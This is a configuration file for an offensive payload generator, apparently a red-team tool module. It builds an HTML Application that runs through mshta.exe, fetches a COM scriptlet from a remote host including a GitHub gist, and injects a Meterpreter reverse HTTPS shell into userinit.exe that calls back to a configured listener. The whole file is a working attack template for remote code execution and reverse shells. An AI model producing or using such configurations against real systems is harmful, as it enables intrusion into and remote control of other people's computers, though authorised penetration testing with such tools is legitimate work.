[Type]
name: HTA2Shell
info: COM Scriptlet (SCT) using MSHTA
template: ./template/SCT/HTA-Shellcode.template
runInfo: mshta.exe ${Output:var}

[HostedDomain]
var: http://127.0.0.1
allowWilds: True
help: The domain, IP, or path of your Hosted SCT second stage

[HostedSct]
var: README.txt
allowWilds: True
help: The file name of your Hosted SCT second stage

[ListenerDomain]
var: 127.0.0.1
allowWilds: True
help: Your listener domain or IP, can be a redirector

[ListenerPort]
var: 443
allowWilds: True
help: Your listener port

[Process]
var: userinit.exe
allowWilds: True
help: May be any .exe in //System32/

[Payload]
var: windows/meterpreter/reverse_https
help: The type of payload

[Scriptlet]
var: https://gist.githubusercontent.com/ConsciousHacker/e79dbe2799f3db9c463125eb39adfbb7/raw/9e1f4109b06bf5e644a09a454f84ef6762a2bba8/jscript_to_shellcode.sct
help: COM scriptlet that gets called via GetObject in the HTML Application

[Output]
var: HTAtoShell.hta
allowWilds: True